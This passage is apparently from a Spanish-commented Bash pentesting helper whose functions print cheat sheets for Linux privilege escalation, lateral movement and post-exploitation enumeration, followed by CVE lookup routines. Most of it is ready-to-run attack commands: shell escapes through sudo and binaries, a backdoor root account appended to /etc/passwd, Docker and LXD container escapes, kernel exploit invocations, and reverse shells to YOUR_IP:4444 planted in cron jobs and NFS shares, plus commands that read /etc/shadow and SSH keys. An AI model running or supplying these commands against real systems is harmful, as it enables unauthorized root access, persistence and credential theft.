     # nmap     -> nmap --interactive -> !sh
     # vim      -> vim -c ':!sh'
     # find     -> find . -exec /bin/sh \;
     # bash     -> bash -p
     # python   -> python -c 'import os; os.execl("/bin/sh","sh","-p")'
     # perl     -> perl -e 'exec "/bin/sh";'
     # ruby     -> ruby -e 'exec "/bin/sh"'
     # less     -> less /etc/passwd -> !sh
     # more     -> more /etc/passwd -> !sh
  
  2. SUDO MISCONFIG:
     sudo -l
     # Si NOPASSWD: buscar en GTFOBins
     # Ejemplos comunes:
     # sudo vim       -> :!sh
     # sudo find      -> find . -exec /bin/sh \;
     # sudo python    -> python -c 'import os; os.system("/bin/sh")'
     # sudo perl      -> perl -e 'exec "/bin/sh";'
     # sudo nmap      -> !sh
     # sudo less      -> !sh
     # sudo awk       -> awk 'BEGIN {system("/bin/sh")}'
  
  3. CRON JOBS:
     cat /etc/crontab
     ls -la /etc/cron.*
     # Buscar scripts ejecutables por root:
     # Si hay script en directorio writable:
     echo '#!/bin/bash' > /writable/script.sh
     echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /writable/script.sh
     
     # Cron PATH hijacking:
     # Si root ejecuta "backup.sh" sin path completo:
     # Crear /tmp/backup.sh con reverse shell
  
  4. WRITABLE /etc/passwd:
     ls -la /etc/passwd
     # Si writable (permiso 666 o tu usuario es owner):
     openssl passwd -1 -salt salt password
     echo 'root2:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
     su root2  # password: password
  
  5. CAPABILITIES:
     getcap -r / 2>/dev/null
     # Si py capability:
     python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
     # Si perl capability:
     perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
  
  6. DOCKER/LXC ESCAPE:
     id | grep -i docker
     # Si en grupo docker:
     docker run -v /:/mnt --rm -it alpine chroot /mnt sh
     
     # LXD escape:
     ls -la /dev/lxd/sock
     lxc init ubuntu:18.04 pwned -c security.privileged=true
     lxc config device add pwned host-root disk source=/ path=/mnt/root
     lxc start pwned
     lxc exec pwned /mnt/root/bin/bash
  
  7. KERNEL EXPLOITS:
     uname -r
     cat /etc/os-release
     # DirtyPipe (5.8+):
     ./dirtypipe /etc/passwd 1 '${uid}0::0:root:/root:/bin/bash'
     # DirtyCow (2.6.22-4.8.3):
     ./dirtycow
     # PwnKit (pkexec):
     ./pwnkit
  
  8. NFS ESCAPE:
     # Si root_squashing deshabilitado en share exportado:
     showmount -e TARGET
     mkdir -p /mnt/nfs
     mount -t nfs TARGET:/share /mnt/nfs -o nolock
     cp /bin/bash /mnt/nfs/rootbash
     chmod +s /mnt/nfs/rootbash
     # En target: /share/rootbash -p
  
  9. NFS NO_ROOT_SQUASH RCE:
     # Crear script de reverse shell en share:
     echo '#!/bin/bash' > /mnt/nfs/shell.sh
     echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /mnt/nfs/shell.sh
     chmod +x /mnt/nfs/shell.sh
     # Configurar cron o esperar ejecucion
  
 10. WRITABLE CRONTAB:
     # Si /etc/cron.d/ es writable:
     echo '* * * * * root bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"' > /etc/cron.d/reverse
EOF
}

get_linux_lateral_movement() {
    cat << 'EOF'
  [LINUX - MOVIMIENTO LATERAL]
  
  1. SSH KEY REUSE:
     find / -name "id_rsa" 2>/dev/null
     find / -name "authorized_keys" 2>/dev/null
     find / -name "*.pem" 2>/dev/null
     # Si encuentras clave privada:
     chmod 600 id_rsa
     ssh -i id_rsa user@TARGET
  
   2. SSH AGENT FORWARDING:
      # Si hay agent forwarding habilitado:
      ssh-add -l
      # Conectarte al agent:
      SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh target
  
  3. SSH TUNNELING:
     # Port forward local:
     ssh -L 8080:internal:80 user@TARGET
     
     # SOCKS proxy:
     ssh -D 1080 user@TARGET
     
     # Remote port forward:
     ssh -R 8080:localhost:80 user@TARGET
     
     # ProxyChains:
     ssh -D 1080 user@TARGET
     # En /etc/proxychains4.conf: socks5 127.0.0.1 1080
     proxychains nmap -sT -p 22,80,443 internal_host
  
  4. RSYNC ABUSE:
     # Si tienes credenciales:
     rsync -avz user@TARGET::module/ ./output/
     # Buscar: configs, SSH keys, passwords
  
  5. NFS MOUNT:
     showmount -e TARGET
     mkdir -p /mnt/target
     mount -t nfs TARGET:/share /mnt/target -o nolock
     # Buscar: .ssh/, .bash_history, config files
  
  6. CRON ABUSE:
     # Si puedes modificar cron job que ejecuta root:
     # Inyectar reverse shell en el script
  
  7. RESOLVER:
     # Si hay /etc/resolv.conf apuntando a DNS interno:
     cat /etc/resolv.conf
     # Buscar zonas DNS internas
  
  8. DOCKER SOCKET:
     ls -la /var/run/docker.sock
     # Si accesible:
     docker -H unix:///var/run/docker.sock ps
     docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
EOF
}

get_linux_post_enumeration() {
    cat << 'EOF'
  [LINUX - POST-ENUMERACION]
  
  1. SISTEMA:
     cat /etc/os-release
     uname -a
     hostname
     id
     sudo -l
  
  2. USUARIOS:
     cat /etc/passwd | grep -v nologin
     cat /etc/shadow 2>/dev/null
     ls -la /home/
     cat /home/*/.bash_history 2>/dev/null
     cat /home/*/.ssh/* 2>/dev/null
  
  3. ARCHIVOS SENSIBLES:
     find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null
     find / -name "*.bak" -o -name "*.old" -o -name "*.swp" 2>/dev/null
     find / -name "*.log" 2>/dev/null
     find / -name "password*" -o -name "passwd*" 2>/dev/null
     cat /var/log/auth.log 2>/dev/null
     cat /var/log/syslog 2>/dev/null
  
  4. REDES:
     ip addr
     ip route
     cat /etc/hosts
     cat /etc/resolv.conf
     netstat -tlnp 2>/dev/null
     ss -tlnp
  
  5. PROCESOS:
     ps aux
     ps -ef
     cat /proc/*/cmdline 2>/dev/null
  
  6. CRON:
     cat /etc/crontab
     ls -la /etc/cron.d/
     ls -la /var/spool/cron/
     crontab -l
  
  7. DOCKER:
     id | grep -i docker
     ls -la /var/run/docker.sock
     docker ps 2>/dev/null
  
  8. MOUNTS:
     mount
     cat /etc/fstab
     findmnt
      df -h
EOF
}

get_linux_cve_by_severity() {
    local severity="$1"
    local result=""
    local count=0
    
    for cve in "${!CVE_LIN_DESCRIPTION[@]}"; do
        if [ "${CVE_LIN_SEVERITY[$cve]}" = "$severity" ]; then
            result="${result}  ${R}$cve${W} | ${CVE_LIN_DESCRIPTION[$cve]}\n"
            result="${result}    Afecta: ${CVE_LIN_AFFECTED[$cve]}\n"
            result="${result}    Exploit: ${CVE_LIN_EXPLOIT[$cve]}\n"
            count=$((count + 1))
        fi
    done
    
    if [ "$count" -eq 0 ]; then
        echo "  No se encontraron CVEs con severidad $severity."
    else
        echo -e "$result"
    fi
}

get_linux_cve_by_product() {
    local product="$1"
    local result=""
    local count=0
    
    for cve in "${!CVE_LIN_DESCRIPTION[@]}"; do
        if echo "${CVE_LIN_DESCRIPTION[$cve]} ${CVE_LIN_AFFECTED[$cve]}" | grep -qi "$product"; then
            result="${result}  ${R}$cve${W} | ${CVE_LIN_DESCRIPTION[$cve]} | [${CVE_LIN_SEVERITY[$cve]}]\n"
            result="${result}    Afecta: ${CVE_LIN_AFFECTED[$cve]}\n"
            result="${result}    Exploit: ${CVE_LIN_EXPLOIT[$cve]}\n"
            count=$((count + 1))
        fi
    done
    
    if [ "$count" -eq 0 ]; then
        echo "  No se encontraron CVEs para el producto: $product"
    else
        echo -e "$result"
    fi
}
